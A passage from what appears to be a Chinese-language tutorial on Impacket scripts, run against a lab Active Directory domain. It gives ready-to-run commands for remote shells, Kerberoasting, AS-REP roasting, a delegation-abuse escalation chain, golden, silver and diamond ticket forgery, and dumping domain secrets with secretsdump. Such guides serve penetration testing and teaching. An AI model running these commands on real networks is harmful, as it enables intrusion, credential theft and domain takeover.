py -3 <a target="_blank" rel="noopener" href="http://xxx.py">xxx.py</a> -k -no-pass</p>
<h3 id="指定目标IP">指定目标IP</h3>
<p>-target-ip 192.168.40.156</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124122856-82299bf8-6bb0-1.png" alt=""></p>
<h3 id="指定域控IP">指定域控IP</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-dc-ip 192.168.40.156</span><br></pre></td></tr></table></figure>
<h2 id="远程执行">远程执行</h2>
<h3 id="psexec-py"><a target="_blank" rel="noopener" href="http://psexec.py">psexec.py</a></h3>
<p>可使用密码认证、hash认证、kerberos认证。</p>
<h4 id="常用命令">常用命令</h4>
<p><strong>交互式Shell</strong></p>
<p>py -3 <a target="_blank" rel="noopener" href="http://psexec.py">psexec.py</a> test/administrator:1qaz@WSX@192.168.40.156</p>
<p><strong>执行单命令</strong></p>
<p>py -3 <a target="_blank" rel="noopener" href="http://psexec.py">psexec.py</a> test/administrator:1qaz@WSX@192.168.40.156 whoami</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124122920-909b866a-6bb0-1.png" alt=""></p>
<p><strong>上传文件并执行</strong></p>
<p>py -3 <a target="_blank" rel="noopener" href="http://psexec.py">psexec.py</a> test/administrator@192.168.40.156 “/c 1+1”  -remote-binary-name test.exe  -codec 936 -path c:\windows\temp\ -c p.exe -hashes :161cff084477fe596a5db81874498a24</p>
<h4 id="常用选项">常用选项</h4>
<p>-port [destination port] 指定目标SMB的端口<br>
-codec codec 目标回显的编码，可先执行chcp.com拿到回显编码<br>
-service-name service_name 指定创建服务的名称，默认随机<br>
-remote-binary-name remote_binary_name 指定上传文件的名称，默认随机</p>
<h3 id="smbexec-py"><a target="_blank" rel="noopener" href="http://smbexec.py">smbexec.py</a></h3>
<p>可使用密码认证、hash认证、kerberos认证。</p>
<p>需要注意此脚本有一些参数是硬编码的，最好使用前修改一下。还可以增加单行命令执行的功能。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124122940-9ce681ae-6bb0-1.png" alt=""></p>
<h4 id="常用命令-2">常用命令</h4>
<p><strong>交互式Shell</strong></p>
<p>py -3 <a target="_blank" rel="noopener" href="http://smbexec.py">smbexec.py</a> test/administrator:1qaz@WSX@192.168.40.156</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123005-ab53a01e-6bb0-1.png" alt=""></p>
<h4 id="常用选项-2">常用选项</h4>
<p>-share SHARE 自定义回显的共享路径，默认为C$<br>
-mode {SHARE,SERVER} 设置SHARE回显或者SERVER回显，SERVER回显需要root linux<br>
-shell-type {cmd,powershell} 设置返回的Shell类型</p>
<h3 id="atexec-py"><a target="_blank" rel="noopener" href="http://atexec.py">atexec.py</a></h3>
<p>可使用密码认证、hash认证、kerberos认证。</p>
<p>脚本使用前可修改一下回显的共享路径</p>
<h4 id="常用命令-3">常用命令</h4>
<p><strong>执行命令获得回显</strong></p>
<p>py -3 <a target="_blank" rel="noopener" href="http://atexec.py">atexec.py</a> test/administrator:1qaz@WSX@192.168.40.156 whoami</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123158-eed26a6e-6bb0-1.png" alt=""></p>
<h4 id="常用选项-3">常用选项</h4>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123225-ff09fdac-6bb0-1.png" alt=""></p>
<p>-session-id SESSION_ID 使用登录的SESSION运行（无回显，不会主动调用cmd如silentcommand）<br>
-silentcommand 不运行cmd.exe，直接运行命令</p>
<h3 id="wmiexec-py"><a target="_blank" rel="noopener" href="http://wmiexec.py">wmiexec.py</a></h3>
<p>可使用密码认证、hash认证、kerberos认证。</p>
<h4 id="常用命令-4">常用命令</h4>
<p>py -3 <a target="_blank" rel="noopener" href="http://wmiexec.py">wmiexec.py</a> test/administrator:1qaz@WSX@192.168.40.156</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123309-19264cea-6bb1-1.png" alt=""></p>
<h4 id="常用选项-4">常用选项</h4>
<p>-share SHARE 设置连接的共享路径，默认ADMIN$<br>
-nooutput 不获取输出，没有SMB连接<br>
-silentcommand 不运行cmd.exe，直接运行命令<br>
-shell-type {cmd,powershell} 设置返回的Shell类型<br>
-com-version MAJOR_VERSION:MINOR_VERSION 设置DCOM版本</p>
<h3 id="dcomexec-py"><a target="_blank" rel="noopener" href="http://dcomexec.py">dcomexec.py</a></h3>
<p>可使用密码认证、hash认证、kerberos认证。</p>
<p>一般使用MMC20，而且DCOM有时候会遇到0x800706ba的错误，一般都是被防火墙拦截。</p>
<h4 id="常用命令-5">常用命令</h4>
<p>py -3 <a target="_blank" rel="noopener" href="http://dcomexec.py">dcomexec.py</a> -object MMC20 <a target="_blank" rel="noopener" href="http://test.com/administrator:1qaz@WSX@192.168.40.156">test.com/administrator:1qaz@WSX@192.168.40.156</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123320-2005f006-6bb1-1.png" alt=""></p>
<h4 id="常用选项-5">常用选项</h4>
<p>-share SHARE 设置连接的共享路径，默认ADMIN$<br>
-nooutput 不获取输出，没有SMB连接<br>
-object [{ShellWindows,ShellBrowserWindow,MMC20}] 设置RCE利用的类型<br>
-com-version MAJOR_VERSION:MINOR_VERSION 设置DCOM版本<br>
-shell-type {cmd,powershell} 设置返回的Shell类型<br>
-silentcommand 不运行cmd.exe，直接运行命令</p>
<h2 id="Kerberos协议">Kerberos协议</h2>
<h3 id="GetTGT-py"><a target="_blank" rel="noopener" href="http://GetTGT.py">GetTGT.py</a></h3>
<p>可使用密码认证、hash认证、kerberos认证。</p>
<p>通过认证后去DC请求TGT并保存。</p>
<h4 id="常用命令-6">常用命令</h4>
<p>获取administrator用户的TGT，TGT过期前可拿来获取其权限</p>
<p>py -3 <a target="_blank" rel="noopener" href="http://GetTGT.py">GetTGT.py</a> test/administrator:1qaz@WSX -dc-ip 192.168.40.156</p>
<h3 id="GetST-py"><a target="_blank" rel="noopener" href="http://GetST.py">GetST.py</a></h3>
<p>可使用密码认证、hash认证、kerberos认证。</p>
<p>通过认证后去DC请求ST并保存。</p>
<h4 id="常用命令-7">常用命令</h4>
<p>用administrator的权限获取AD01.test.com的cifs服务的服务票据（ST）</p>
<p>py -3 <a target="_blank" rel="noopener" href="http://GetST.py">GetST.py</a> test/administrator:1qaz@WSX -dc-ip 192.168.40.156 -spn cifs/AD01.test.com</p>
<h4 id="常用选项-6">常用选项</h4>
<p>-impersonate IMPERSONATE    模拟为指定的用户的权限<br>
-additional-ticket ticket.ccache    在委派的S4U2Proxy中添加一个可转发的服务票据<br>
-force-forwardable  通过CVE-2020-17049强制忽略校验票据是否可转发</p>
<h3 id="GetPac-py"><a target="_blank" rel="noopener" href="http://GetPac.py">GetPac.py</a></h3>
<p>可使用密码认证、hash认证</p>
<h4 id="常用命令-8">常用命令</h4>
<p>查询test用户的PAC，可以看到登录次数、密码错误次数之类的</p>
<p>py -3 <a target="_blank" rel="noopener" href="http://getPac.py">getPac.py</a> <a target="_blank" rel="noopener" href="http://test.com/administrator:1qaz@WSX">test.com/administrator:1qaz@WSX</a> -targetUser test</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123429-48cbe5a4-6bb1-1.png" alt=""></p>
<h3 id="GetUserSPNs-py"><a target="_blank" rel="noopener" href="http://GetUserSPNs.py">GetUserSPNs.py</a></h3>
<p>可使用密码认证、hash认证、Kerberos认证</p>
<h4 id="常用命令-9">常用命令</h4>
<p>查询test.com中的用户的SPN有哪些，只需要任意一个域用户即可利用，只要有用户的SPN可以请求，可以获取其TGS爆破其密码</p>
<p>py -3 <a target="_blank" rel="noopener" href="http://GetUserSPNs.py">GetUserSPNs.py</a> <a target="_blank" rel="noopener" href="http://test.com/administrator:1qaz@WSX">test.com/administrator:1qaz@WSX</a> -target-domain <a target="_blank" rel="noopener" href="http://test.com">test.com</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123534-6f7ca594-6bb1-1.png" alt=""></p>
<h4 id="常用选项-7">常用选项</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-request 请求所有用户SPN的TGS，可拿来爆破用户密码</span><br><span class="line">-request-user username 请求指定用户的TGS</span><br><span class="line">-usersfile USERSFILE 请求指定文件内所有用户的TGS</span><br></pre></td></tr></table></figure>
<h3 id="GetNPUsers-py"><a target="_blank" rel="noopener" href="http://GetNPUsers.py">GetNPUsers.py</a></h3>
<p>可使用密码认证、hash认证、Kerberos认证</p>
<h4 id="常用命令-10">常用命令</h4>
<p>查询域内哪些用户不需要Kerberos预身份认证，只需要任意一个域用户即可利用，只要有用户不需要Kerberos预身份认证，可以获取其AS_REQ拿来爆破其密码。</p>
<p>py -3 <a target="_blank" rel="noopener" href="http://GetNPUsers.py">GetNPUsers.py</a> <a target="_blank" rel="noopener" href="http://test.com/test:1qaz@WSX">test.com/test:1qaz@WSX</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123542-743a237c-6bb1-1.png" alt=""></p>
<h4 id="常用选项-8">常用选项</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-request 请求不需要Kerberos预身份认证用户的TGT，可拿来爆破</span><br><span class="line">-format &#123;hashcat,john&#125; 设置AS_REQ的爆破格式，默认hashcat</span><br><span class="line">-usersfile USERSFILE 请求指定文件内所有用户的TGT</span><br><span class="line">-outputfile OUTPUTFILE 向指定文件输出结果</span><br></pre></td></tr></table></figure>
<h3 id="rbcd-py"><a target="_blank" rel="noopener" href="http://rbcd.py">rbcd.py</a></h3>
<p>可使用密码认证、hash认证、Kerberos认证</p>
<p>rbcd这个脚本适合于已经有了一个域用户，然后发现该用户对目标机器的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性有写权限。例如有<code>GenericAll</code>就包含此子权限。</p>
<p>此时通过该域用户创建一个机器账户加入域，就能将机器账户的SID写入目标机器的属性中。从而让机器账户可以在目标机器上通过委派模拟为任意用户的权限。</p>
<h4 id="常用命令-11">常用命令</h4>
<p>使用test用户，向<code>WIN-7$</code>的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性写入<code>test_computer$</code>的SID</p>
<p>py -3 .\rbcd.py -delegate-to WIN-7$ -delegate-from test_computer$ -dc-ip 192.168.40.140 test/test:1qaz@WSX -action write</p>
<h4 id="常用选项-9">常用选项</h4>
<p>-action [{read,write,remove,flush}] 选择要对特殊属性进行的操作，可选读取、写入、删除、清空<br>
-use-ldaps 使用LDAPS协议替换LDAP</p>
<h4 id="利用实例">利用实例</h4>
<p>因为这个脚本利用比较复杂，所以增加了利用实例</p>
<p>比如，此时我在域中拥有一个普通用户test:1qaz@WSX，通过ACL发现test对WIN-7具有<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的写权限。</p>
<p>所以我先通过test添加一个computer，test_computer$:1qaz@WSX，命令如下：</p>
<p>py -3 <a target="_blank" rel="noopener" href="http://addcomputer.py">addcomputer.py</a> <a target="_blank" rel="noopener" href="http://test.com/test:1qaz@WSX">test.com/test:1qaz@WSX</a> -computer-name test_computer$ -computer-pass 1qaz@WSX</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123552-7a7de570-6bb1-1.png" alt=""></p>
<p>然后通过test用户和rbcd.py脚本给WIN-7设置属性。将WIN-7$的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性指向test_computer$</p>
<p>py -3 .\rbcd.py -delegate-to WIN-7$ -delegate-from test_computer$ -dc-ip 192.168.40.140 test/test:1qaz@WSX -action write</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123559-7e55e22e-6bb1-1.png" alt=""></p>
<p>设置好属性后，使用getST.py获取到administrator的<code>cifs/WIN-7</code>的服务票据（ST）</p>
<p>py -3 .\getST.py -spn ‘cifs/WIN-7’ -impersonate administrator -dc-ip 192.168.40.140 ‘test/test_computer$:1qaz@WSX’</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123608-83b309d6-6bb1-1.png" alt=""></p>
<p>将生成的适合Linux使用的ccache格式转换为Windows的kirbi</p>
<p>py -3 .\ticketConverter.py .\administrator.ccache .\administrator.kirbi</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123615-8814309a-6bb1-1.png" alt=""></p>
<p>通过mimikatz加载票据</p>
<p>kerberos::ptt C:\Python38\Scripts\administrator.kirbi</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123621-8bb3e8d0-6bb1-1.png" alt=""></p>
<p>此时即可正式利用，可通过klist查看票据确实注入了。然后直接对目标的cifs进行dir操作，或通过psexec等横向手法横向即可。如下图所示：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123631-9197cea6-6bb1-1.png" alt=""></p>
<h4 id="无MAQ时的新利用方式">无MAQ时的新利用方式</h4>
<p>当用户具有A机器的写权限，但是无法新建机器利用rbcd，且当前用户没有可用的SPN时，可以使用该技术。该技术还未并入主进程。</p>
<p>使用UPN替代SPN进行rbcd。流程如下：</p>
<p>用test用户的权限请求模拟administrator用户的服务票据，仅在rbcd情况下有效。且获取TGT后要将TGT的Sessionkey改为test的hash。否则TGS无法解密</p>
<p>#请求test/test用户的TGT<br>
<a target="_blank" rel="noopener" href="http://getTGT.py">getTGT.py</a> -hashes :$(pypykatz crypto nt ‘password’) test/test<br>
#查看TGT里面的Ticket Session Key<br>
<a target="_blank" rel="noopener" href="http://describeTicket.py">describeTicket.py</a> ‘TGT.ccache’ | grep ‘Ticket Session Key’<br>
#将test/test用户的hash改为TGTSessionKey<br>
<a target="_blank" rel="noopener" href="http://smbpasswd.py">smbpasswd.py</a> -newhashes :TGTSessionKey test/test:‘password’@‘dc01’<br>
#通过委派模拟为administrator用户<br>
KRBR5CCNAME=‘TGT.ccache’<br>
<a target="_blank" rel="noopener" href="http://getST.py">getST.py</a> -u2u -impersonate Administrator -k -no-pass test/test<br>
#还原test/test用户的hash<br>
<a target="_blank" rel="noopener" href="http://smbpasswd.py">smbpasswd.py</a> -hashes :TGTSessionKey -newhashes :OldNTHash test/test@‘dc01’</p>
<p>参考资料：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus/pull/137">https://github.com/GhostPack/Rubeus/pull/137</a></p>
<h3 id="ticketConverter-py"><a target="_blank" rel="noopener" href="http://ticketConverter.py">ticketConverter.py</a></h3>
<p>不需要认证，因为这个脚本是在ccache和kirbi格式中互相转换用的脚本。</p>
<h4 id="常用命令-12">常用命令</h4>
<p>将ccache转换为kirbi，交换位置就是kirbi转换为ccache</p>
<p>py -3 .\ticketConverter.py .\administrator.ccache .\administrator.kirbi</p>
<h3 id="ticketer-py"><a target="_blank" rel="noopener" href="http://ticketer.py">ticketer.py</a></h3>
<p>可使用密码认证、hash认证</p>
<p>这个脚本主要拿来伪造各种服务票据，例如银票据、金票据、钻石票据、蓝宝石票据。</p>
<p>注意2021年11月更新之后，如果用户名在AD域中不存在，则票据会被拒绝。</p>
<h4 id="常用命令-13">常用命令</h4>
<p><strong>银票伪造</strong></p>
<p>银票因为不需要与DC通信，所以比金票更加隐蔽。但是银票只能对伪造的服务有效，且会随着服务账户密码的修改而失效。</p>
<p>使用win-7$的机器账户的hash<code>96dd976cc094ca1ddb2f06476fb61eb6</code>伪造<code>cifs/win-7</code>的服务票据，使用票据的用户是根本不存在的qqq或者存在的任意用户。</p>
<p>py -3 .\ticketer.py -spn cifs/win-7 -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -domain <a target="_blank" rel="noopener" href="http://test.com">test.com</a> -nthash 96dd976cc094ca1ddb2f06476fb61eb6 qqq</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123644-9943f9fe-6bb1-1.png" alt=""></p>
<p><strong>金票伪造</strong></p>
<p>使用krbtgt的密钥伪造TGT中的PAC的权限，证明任意用户属于特权组。然后通过伪造了PAC的TGT换ST，从而获得任意服务的权限。金票据因为需要和DC进行交互，所以建议在域内使用，域外通过代理使用有时候会换不到ST。</p>
<p>注意金票会随着krbtgt密码的修改而失效</p>
<p>在银票的命令基础上去掉-spn，将nthash修改为krbtgt的hash即可。</p>
<p>py -3 .\ticketer.py -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -domain <a target="_blank" rel="noopener" href="http://test.com">test.com</a> -nthash 96dd976cc094ca1ddb2f06476fb61eb6 qqq</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123703-a49dcc44-6bb1-1.png" alt=""></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123713-aa8e4232-6bb1-1.png" alt=""></p>
<p><strong>钻石票据伪造</strong></p>
<p>由于金票据和银票据没有合法的KRB_AS_REQ或KRB_TGS_REG请求，所以会被发现。而钻石票据会正常请求票据，然后解密票据的PAC，修改并重新加密。从而增加了隐蔽性。</p>
<p>aesKey是krbtgt的密钥，注意一般aesKey都是256位加密的，这个得看DC的算法。不过128也建议存一份吧</p>
<p>-user-id和-groups是可选的，如果不选分别会默认500和513, 512, 520, 518, 519</p>
<p>-user和-password是要真实去发起TGT请求的用户的账密，可使用hash。这个用户实际上是什么权限不重要</p>
<p>py -3 <a target="_blank" rel="noopener" href="http://ticketer.py">ticketer.py</a> -request -domain <a target="_blank" rel="noopener" href="http://test.com">test.com</a> -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -user administrator -password 1qaz@WSX -aesKey 245a674a434726c081385a3e2b33b62397e9b5fd7d02a613212c7407b9f13b41 -user-id 1500 -groups 12,513,518,519,520 qqq</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123722-afd66ad0-6bb1-1.png" alt=""></p>
<p><strong>蓝宝石票据伪造</strong></p>
<p>钻石票据是伪造的PAC特权，但是蓝宝石票据是将真实高权限用户的PAC替换到低权限的TGT中，从而成为目前最难检测的手法</p>
<p>不过该技术还是impacket的一个分支，正在等待合并。</p>
<p>注意，因脚本问题，未复现成功</p>
<p>py -3 ticketer_imper.py -request -domain <a target="_blank" rel="noopener" href="http://test.com">test.com</a> -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -user administrator -password 1qaz@WSX -aesKey 245a674a434726c081385a3e2b33b62397e9b5fd7d02a613212c7407b9f13b41 -impersonate administrator qqq</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/pull/1411">https://github.com/SecureAuthCorp/impacket/pull/1411</a></p>
<h4 id="常用选项-10">常用选项</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-spn SPN 银票用，一般都是某个服务器的cifs或DC的ldap服务，mssql啥的也可以考虑</span><br><span class="line">-request 要求请求TGT，这个脚本里可以理解为钻石票据伪造。必须同时存在-user和-password</span><br><span class="line">-aesKey hex key 用来签名票据的krbtgt的AES加密的密码</span><br><span class="line">-nthash NTHASH  用来签名票据的krbtgt的NTLM加密的密码</span><br><span class="line">-keytab KEYTAB 请求文件内容中的多个银票据</span><br><span class="line">-duration DURATION 修改票据的失效时间</span><br><span class="line">-user-id USER_ID 指定伪造PAC的用户权限ID,默认是500 管理员</span><br><span class="line">-groups GROUPS 指定伪造PAC的组权限ID，默认是513, 512, 520, 518, 519这五个组</span><br></pre></td></tr></table></figure>
<h3 id="raiseChild-py-无环境"><a target="_blank" rel="noopener" href="http://raiseChild.py">raiseChild.py</a>(无环境)</h3>
<p>可使用密码认证、hash认证、Kerberos认证</p>
<h4 id="常用命令-14">常用命令</h4>
<p>py -3 <a target="_blank" rel="noopener" href="http://raiseChild.py">raiseChild.py</a> <a target="_blank" rel="noopener" href="http://childDomain.net/adminuser:mypwd">childDomain.net/adminuser:mypwd</a></p>
<h4 id="常用选项-11">常用选项</h4>
<h2 id="Windows密码">Windows密码</h2>
<h3 id="secretsdump-py"><a target="_blank" rel="noopener" href="http://secretsdump.py">secretsdump.py</a></h3>
<h4 id="常用命令-15">常用命令</h4>
<p><strong>基于NTLM认证，使用机器用户导出</strong></p>
<p>py -3 <a target="_blank" rel="noopener" href="http://secretsdump.py">secretsdump.py</a> -hashes 5f8506740ed68996ffd4e5cf80cb5174:5f8506740ed68996ffd4e5cf80cb5174 “domain/DC$@DCIP” -just-dc-user krbtgt</p>
<p><strong>基于Kerberos票据导出</strong></p>
<p>export KRB5CCNAME=ad01.ccache<br>
py -3 <a target="_blank" rel="noopener" href="http://secretsdump.py">secretsdump.py</a> -k -no-pass <a target="_blank" rel="noopener" href="http://AD01.test.com">AD01.test.com</a> -dc-ip 192.168.111.146 -target-ip 192.168.111.146 -just-dc-user krbtgt</p>
<p><strong>本地解密SAM</strong></p>
<p>py -3 .py -sam sam.save -system system.save -security security.save LOCAL</p>
<h4 id="常用选项-12">常用选项</h4>
<blockquote>
<p>-system SYSTEM SYSTEM文件<br>
-security SECURITY security文件<br>
-sam SAM SAM文件<br>
-ntds NTDS NTDS.DIT文件<br>
-resumefile RESUMEFILE 待恢复的NTDS.DIT转储文件<br>
-outputfile OUTPUTFILE 输出的文件名<br>
-use-vss 使用vss卷影替代DRSUAPI<br>
-rodcNo RODCNO Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)<br>
-rodcKey RODCKEY AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)<br>
-use-keylist 使用KerberosKeyList转储TGS-REQ<br>
-exec-method [{smbexec,wmiexec,mmcexec}] 使用vss卷影导出时执行命令的方法，分别有smbexec、wmiexec、mmcexec</p>
</blockquote>
<h3 id="mimikatz-py"><a target="_blank" rel="noopener" href="http://mimikatz.py">mimikatz.py</a></h3>
<p>这是一个比较鸡肋的功能，需要先在目标机器上用mimikatz执行rpc::server</p>
<p>然后用该脚本进行连接</p>
<p>py -3 .\mimikatz.py <a target="_blank" rel="noopener" href="http://test.com/administrator:1qaz@WSX@192.168.40.158">test.com/administrator:1qaz@WSX@192.168.40.158</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124123733-b6d03d16-6bb1-1.png" alt=""></p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/link/">Friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Impacket脚本利用指南（上）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">Impacket的脚本介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">Impacket脚本使用实例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E9%80%89%E9%A1%B9"><span class="toc-number">3.1.</span> <span class="toc-text">通用选项</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hash%E8%AE%A4%E8%AF%81"><span class="toc-number">3.1.1.</span> <span class="toc-text">hash认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E8%AE%A4%E8%AF%81"><span class="toc-number">3.1.2.</span> <span class="toc-text">Kerberos认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E7%9B%AE%E6%A0%87IP"><span class="toc-number">3.1.3.</span> <span class="toc-text">指定目标IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%9F%9F%E6%8E%A7IP"><span class="toc-number">3.1.4.</span> <span class="toc-text">指定域控IP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C"><span class="toc-number">3.2.</span> <span class="toc-text">远程执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#psexec-py"><span class="toc-number">3.2.1.</span> <span class="toc-text">psexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smbexec-py"><span class="toc-number">3.2.2.</span> <span class="toc-text">smbexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-2"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-2"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#atexec-py"><span class="toc-number">3.2.3.</span> <span class="toc-text">atexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-3"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-3"><span class="toc-number">3.2.3.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec-py"><span class="toc-number">3.2.4.</span> <span class="toc-text">wmiexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-4"><span class="toc-number">3.2.4.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-4"><span class="toc-number">3.2.4.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dcomexec-py"><span class="toc-number">3.2.5.</span> <span class="toc-text">dcomexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-5"><span class="toc-number">3.2.5.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-5"><span class="toc-number">3.2.5.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.3.</span> <span class="toc-text">Kerberos协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GetTGT-py"><span class="toc-number">3.3.1.</span> <span class="toc-text">GetTGT.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-6"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">常用命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetST-py"><span class="toc-number">3.3.2.</span> <span class="toc-text">GetST.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-7"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-6"><span class="toc-number">3.3.2.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetPac-py"><span class="toc-number">3.3.3.</span> <span class="toc-text">GetPac.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-8"><span class="toc-number">3.3.3.1.</span> <span class="toc-text">常用命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetUserSPNs-py"><span class="toc-number">3.3.4.</span> <span class="toc-text">GetUserSPNs.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-9"><span class="toc-number">3.3.4.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-7"><span 